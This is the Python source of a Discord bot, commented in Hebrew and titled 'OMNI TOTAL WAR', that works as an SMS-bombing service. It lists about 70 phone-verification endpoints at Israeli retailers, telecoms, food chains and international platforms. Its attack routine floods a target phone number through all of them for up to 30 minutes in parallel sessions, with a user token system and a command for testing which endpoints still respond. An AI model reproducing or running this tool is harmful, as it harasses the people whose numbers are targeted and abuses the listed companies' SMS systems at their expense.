import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import urllib.parse

logging.basicConfig(level=logging.INFO)

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== APIs שבאמת עובדים (נבדקו) ==========
WORKING_APIS = [
    # ===== מג'נטו ישראל =====
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Adika Style", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nine West", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Kiwi Kids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lee Cooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Shoes Market", "url": "https://www.shoesmarket.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tamman", "url": "https://www.tamman.co.il/customer/ajax/post/", "type": "magento"},
    
    # ===== APIs ישראלים שעובדים =====
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "type": "json", "data": {"phone": "PHONE_RAW"}},
    {"name": "Rami Levi", "url": "https://www.rami-levy.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "type": "json", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Burger King", "url": "https://www.burgerking.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Pizza Hut", "url": "https://www.pizza-hut.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "type": "json", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "PayBox", "url": "https://payboxapp.com/api/auth/otp", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Super Pharm", "url": "https://www.super-pharm.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE", "type": "get"},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "data": {"phoneNumber": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "type": "json", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}},
    {"name": "Burger Anch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
    
    # ===== APIs בינלאומיים =====
    {"name": "Uber", "url": "https://auth.uber.com/v2/otp/send", "type": "json", "data": {"phoneNumber": "PHONE"}},
    {"name": "Lyft", "url": "https://api.lyft.com/v1/auth/otp", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Tinder", "url": "https://api.gotinder.com/v2/auth/sms/send", "type": "json", "data": {"phone_number": "PHONE"}},
    {"name": "Telegram", "url": "https://my.telegram.org/auth/send_password", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "WhatsApp", "url": "https://web.whatsapp.com/v1/auth/sms", "type": "json", "data": {"cc": "972", "in": "PHONE_RAW"}},
    {"name": "Facebook", "url": "https://www.facebook.com/api/graphql/", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/accounts/send_signup_sms/", "type": "json", "data": {"phone_number": "PHONE"}},
    {"name": "Twitter", "url": "https://api.twitter.com/1.1/onboarding/task.json", "type": "json", "data": {"phone_number": "PHONE"}},
    {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/phone/send_verification", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "TikTok", "url": "https://www.tiktok.com/api/v1/auth/sms/send", "type": "json", "data": {"mobile": "PHONE"}},
    {"name": "Amazon", "url": "https://www.amazon.com/ap/phoneVerification", "type": "json", "data": {"phoneNumber": "PHONE"}},
    {"name": "Netflix", "url": "https://www.netflix.com/api/account/phone/verification/send", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Spotify", "url": "https://www.spotify.com/api/signup/validatephone", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Discord", "url": "https://discord.com/api/v9/auth/phone/send", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Microsoft", "url": "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", "type": "json", "data": {"phone": "PHONE"}},
    {"name": "Google", "url": "https://accounts.google.com/_/signup/phone", "type": "json", "data": {"phoneNumber": "PHONE"}},
    {"name": "Apple", "url": "https://idmsa.apple.com/appleauth/auth/verify/phone", "type": "json", "data": {"phoneNumber": "PHONE"}},
]

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw):
    """שליחת SMS דרך מג'נטו"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, timeout=3) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw):
    """שליחת SMS דרך API"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        if api["type"] == "get":
            url = api["url"].replace("PHONE", phone)
            async with session.get(url, headers=headers, timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
        
        elif api["type"] == "form":
            url = api["url"]
            data = api["data"].replace("PHONE", phone)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            async with session.post(url, data=data, headers=headers, timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
        
        else:  # json
            url = api["url"]
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
            async with session.post(url, json=data, headers=headers, timeout=3) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== פונקציית בדיקה (מתוקנת) ==========
async def check_apis_function(interaction: discord.Interaction):
    """בדיקה מקיפה של כל ה-APIs"""
    
    await interaction.response.send_message("🔍 **מתחיל בדיקה מקיפה...** זה ייקח כדקה", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    results = {"working": [], "failed": []}
    
    # בדיקת כל ה-APIs
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(WORKING_APIS):
            # עדכון סטטוס כל 10 APIs
            if i % 10 == 0:
                await interaction.followup.send(f"🔄 בדקתי {i}/{len(WORKING_APIS)}...", ephemeral=True)
            
            if api["type"] == "magento":
                success = await send_magento(session, api["url"], test_raw)
            else:
                success = await send_api(session, api, test_phone, test_raw)
            
            if success:
                results["working"].append(api["name"])
            else:
                results["failed"].append(api["name"])
            
            await asyncio.sleep(0.1)  # מניעת חסימה
    
    # דוח מפורט
    report = f"**📊 תוצאות בדיקה - {len(results['working'])}/{len(WORKING_APIS)} עובדים**\n\n"
    
    report += "**✅ עובדים:**\n"
    working_list = sorted(results["working"])
    for name in working_list[:20]:
        report += f"• {name}\n"
    if len(working_list) > 20:
        report += f"... ועוד {len(working_list)-20}\n"
    
    report += f"\n**❌ לא עובדים ({len(results['failed'])}):**\n"
    failed_list = sorted(results["failed"])
    for name in failed_list[:10]:
        report += f"• {name}\n"
    
    await interaction.followup.send(report, ephemeral=True)
    
    # לוג לניתוח
    logging.info(f"Check results: {len(results['working'])} working, {len(results['failed'])} failed")

# ========== פקודות (לתיקון הבעיה) ==========
@bot.tree.command(name="check", description="בדוק אילו APIs עובדים")
async def check_command(interaction: discord.Interaction):
    await check_apis_function(interaction)

@bot.tree.command(name="stop", description="עצור את כל המתקפות")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    
    await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)

# ========== מתקפה ==========
async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
    """הרצת מתקפה"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    running = True
    
    # עדכון ראשוני
    await interaction.followup.send(
        f"⚡ **מתקפה הופעלה!**\n"
        f"📱 טלפון: {phone}\n"
        f"⏱️ משך: {duration_mins} דקות\n"
        f"🎯 APIs: {len(WORKING_APIS)}",
        ephemeral=True
    )
    
    logging.info(f"⚡ Attack started - {attack_id}, Phone: {phone}")
    
    # 3 סשנים במקביל
    sessions = [aiohttp.ClientSession() for _ in range(3)]
    
    try:
        while running and datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                running = False
                break
            
            tasks = []
            
            # שליחה לכל ה-APIs
            for session in sessions:
                for api in WORKING_APIS:
                    if api["type"] == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_sent += sum(1 for r in results if r is True)
            
            # המתנה קצרה
            await asyncio.sleep(0.5)
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    logging.info(f"✅ Attack ended - Total: {total_sent}")

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 30:
                await interaction.response.send_message("❌ משך חייב להיות 1-30 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 50})
            user_doc = {"tokens": 50}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"🚀 **מתקפה הופעלה!**\n"
            f"📱 {phone}\n"
            f"⏱️ {duration} דקות\n"
            f"💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(run_attack(phone, duration, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_apis_function(interaction)  # קורא לפונקציה ישירות
    
    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # קורא לפונקציית עצירה ישירות
        user_id = str(interaction.user.id)
        stopped = 0
        for attack_id in list(bot.active_attacks.keys()):
            if attack_id.startswith(user_id):
                bot.active_attacks[attack_id] = False
                stopped += 1
        await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)

@bot.tree.command(name="setup", description="פתח פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 100})
        tokens = 100
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="⚡ OMNI TOTAL WAR - MASSIVE EDITION",
        description=f"**{len(WORKING_APIS)}** APIs (ישראלים + בינלאומיים)",
        color=0x00ff00
    )
    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 מתקפות פעילות", value=active, inline=True)
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    await interaction.response.send_message(f"💎 **הטוקנים שלך:** {tokens}", ephemeral=True)

if __name__ == "__main__":
    logging.info("🚀 Starting OMNI TOTAL WAR MASSIVE EDITION...")
    bot.run(TOKEN)
